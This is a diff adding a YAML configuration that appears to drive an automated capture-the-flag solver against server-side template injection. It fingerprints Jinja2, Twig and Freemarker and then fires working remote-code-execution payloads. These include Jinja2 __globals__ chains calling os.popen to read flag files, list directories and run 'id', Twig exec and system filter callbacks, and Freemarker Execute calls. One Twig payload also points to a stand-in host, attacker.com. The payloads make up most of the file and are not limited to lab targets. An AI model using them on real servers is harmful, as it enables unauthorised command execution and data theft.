@@ -1,0 +1,236 @@
+# ============================================================
+# Tree metadata
+# ============================================================
+id: web_ssti
+name: Server-Side Template Injection
+category: web
+version: "1.0"
+author: system
+description: >
+  Detects and exploits server-side template injection vulnerabilities by probing
+  for template evaluation in user-controlled parameters. Targets Jinja2, Twig,
+  ERB, Freemarker, and other template engines to achieve RCE.
+
+# ============================================================
+# Guard: when should this tree even be considered?
+# ============================================================
+applies_when:
+  - "context.challenge.type == 'web'"
+
+min_confidence: 0.10
+
+stop_on_flag: true
+
+# ============================================================
+# Confidence seeds
+# ============================================================
+confidence_seeds:
+  - if: "'python' in context.tech_stack or 'jinja2' in context.tech_stack or 'flask' in context.tech_stack or 'django' in context.tech_stack"
+    boost: 0.30
+    label: "Python template engine detected"
+  - if: "'ruby' in context.tech_stack or 'rails' in context.tech_stack or 'erb' in context.tech_stack"
+    boost: 0.20
+    label: "Ruby template engine detected"
+  - if: "'php' in context.tech_stack or 'twig' in context.tech_stack or 'smarty' in context.tech_stack"
+    boost: 0.20
+    label: "PHP template engine detected"
+  - if: "'java' in context.tech_stack or 'freemarker' in context.tech_stack or 'velocity' in context.tech_stack"
+    boost: 0.20
+    label: "Java template engine detected"
+  - if: "any(p in context.params for p in ['name','template','msg','message','content','text','render','greeting','title'])"
+    boost: 0.15
+    label: "Reflection-style parameter found"
+  - if: "any(p in context.found_paths for p in ['/render', '/preview', '/template', '/report', '/generate'])"
+    boost: 0.15
+    label: "Template-related path found"
+
+# ============================================================
+# Detection paths
+# ============================================================
+detection_paths:
+
+  - id: generic_math_probe
+    name: Generic math expression probe
+    description: >
+      Inject {{7*7}}, ${7*7}, #{7*7} etc. and look for 49 in the response.
+      Confirms template evaluation without engine-specific knowledge.
+    min_confidence: 0.10
+    steps:
+      - id: math_inject
+        action: http_probe
+        params:
+          inject_into: all_params
+          payloads:
+            - '{{7*7}}'
+            - '${7*7}'
+            - '#{7*7}'
+            - '<%= 7*7 %>'
+            - "{{7*''7''}}"
+        signals:
+          - match: '49'
+            on_match:
+              confidence_boost: 0.40
+              emit: math_eval_confirmed
+
+  - id: jinja2_specific_probe
+    name: Jinja2-specific detection
+    description: >
+      Use Jinja2-specific syntax {{7*'7'}} which returns 7777777 only in Jinja2.
+    min_confidence: 0.25
+    steps:
+      - id: jinja2_fingerprint
+        action: http_probe
+        params:
+          inject_into: all_params
+          payloads:
+            - "{{7*'7'}}"
+        signals:
+          - match: '7777777'
+            on_match:
+              confidence_boost: 0.35
+              emit: jinja2_confirmed
+
+  - id: twig_specific_probe
+    name: Twig-specific detection
+    description: >
+      Use Twig-specific syntax {{7*'7'}} which returns 49 (different behavior from Jinja2).
+    min_confidence: 0.25
+    steps:
+      - id: twig_fingerprint
+        action: http_probe
+        params:
+          inject_into: all_params
+          payloads:
+            - '{{_self.env.display("TEST")}}'
+            - '{{dump(app)}}'
+        signals:
+          - match: 'TEST|Twig'
+            on_match:
+              confidence_boost: 0.35
+              emit: twig_confirmed
+
+  - id: freemarker_probe
+    name: Freemarker detection
+    description: >
+      Detect Freemarker template engine via Java execution patterns.
+    min_confidence: 0.25
+    steps:
+      - id: freemarker_fingerprint
+        action: http_probe
+        params:
+          inject_into: all_params
+          payloads:
+            - '${7*7}'
+            - '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'
+        signals:
+          - match: '49|uid='
+            on_match:
+              confidence_boost: 0.35
+              emit: freemarker_confirmed
+
+# ============================================================
+# Exploitation paths
+# ============================================================
+exploitation_paths:
+
+  - id: jinja2_rce
+    name: Jinja2 RCE via __class__ chain
+    requires_signal: jinja2_confirmed
+    technique: jinja2_class_traversal
+    steps:
+      - id: read_flag_jinja2
+        action: http_probe
+        params:
+          inject_into: vulnerable_param
+          payloads:
+            - "{{cycler.__init__.__globals__['os'].popen('cat /flag.txt').read()}}"
+            - "{{cycler.__init__.__globals__['os'].popen('cat /flag').read()}}"
+            - "{{lipsum.__globals__['os'].popen('cat /flag.txt').read()}}"
+            - "{{lipsum.__globals__['os'].popen('cat /flag').read()}}"
+            - "{{joiner.__init__.__globals__['os'].popen('cat /flag.txt').read()}}"
+            - "{{joiner.__init__.__globals__['os'].popen('cat /flag').read()}}"
+            - "{{cycler.__init__.__globals__['os'].popen('find / -name flag* -maxdepth 5 2>/dev/null | head -5').read()}}"
+            - "{{cycler.__init__.__globals__['os'].popen('cat /app/flag.txt').read()}}"
+            - "{{cycler.__init__.__globals__['os'].popen('cat /challenge/flag.txt').read()}}"
+            - "{{''.__class__.__mro__[1].__subclasses__()[396]('cat /flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}"
+            - "{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}"
+            - "{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read()}}"
+        capture:
+          - pattern: 'picoCTF\{[^}]+\}'
+            as: flag_value
+          - pattern: 'flag\{[^}]+\}'
+            as: flag_value
+          - pattern: 'CTF\{[^}]+\}'
+            as: flag_value
+          - pattern: '[A-Z0-9_]{20,}'
+            as: flag_value
+
+  - id: twig_rce
+    name: Twig RCE via _self.env
+    requires_signal: twig_confirmed
+    technique: twig_env_exploitation
+    steps:
+      - id: read_flag_twig
+        action: http_probe
+        params:
+          inject_into: vulnerable_param
+          payloads:
+            - '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag.txt")}}'
+            - '{{["cat /flag.txt"]|filter("system")}}'
+            - '{{_self.env.enableDebug()}}{{_self.env.setCache("ftp://attacker.com:2121")}}'
+        capture:
+          - pattern: 'flag\{[^}]+\}'
+            as: flag_value
+          - pattern: 'CTF\{[^}]+\}'
+            as: flag_value
+
+  - id: freemarker_rce
+    name: Freemarker RCE via Execute utility
+    requires_signal: freemarker_confirmed
+    technique: freemarker_execute
+    steps:
+      - id: read_flag_freemarker
+        action: http_probe
+        params:
+          inject_into: vulnerable_param
+          payloads:
+            - '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag.txt")}'
+            - '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat flag.txt")}'
+            - '${\"freemarker.template.utility.Execute\"?new()(\"cat /flag.txt\")}'
+        capture:
+          - pattern: 'flag\{[^}]+\}'
+            as: flag_value
+          - pattern: 'CTF\{[^}]+\}'
+            as: flag_value
+
+  - id: generic_ssti_rce
+    name: Generic SSTI RCE attempt
+    requires_signal: math_eval_confirmed
+    technique: generic_template_rce
+    steps:
+      - id: generic_rce_probes
+        action: http_probe
+        params:
+          inject_into: vulnerable_param
+          payloads:
+            - "{{cycler.__init__.__globals__['os'].popen('id').read()}}"
+            - "{{lipsum.__globals__['os'].popen('id').read()}}"
+      - id: read_flag_generic
+        action: http_probe
+        params:
+          inject_into: vulnerable_param
+          payloads:
+            - "{{cycler.__init__.__globals__['os'].popen('cat /flag.txt').read()}}"
+            - "{{cycler.__init__.__globals__['os'].popen('cat /flag').read()}}"
+            - "{{lipsum.__globals__['os'].popen('cat /flag.txt').read()}}"
+            - "{{lipsum.__globals__['os'].popen('cat /flag').read()}}"
+            - "{{joiner.__init__.__globals__['os'].popen('cat /flag.txt').read()}}"
+            - "{{cycler.__init__.__globals__['os'].popen('find / -name flag* -maxdepth 5 2>/dev/null | head -5').read()}}"
+            - "{{cycler.__init__.__globals__['os'].popen('ls /').read()}}"
+        capture:
+          - pattern: 'picoCTF\{[^}]+\}'
+            as: flag_value
+          - pattern: 'flag\{[^}]+\}'
+            as: flag_value
+          - pattern: 'CTF\{[^}]+\}'
+            as: flag_value
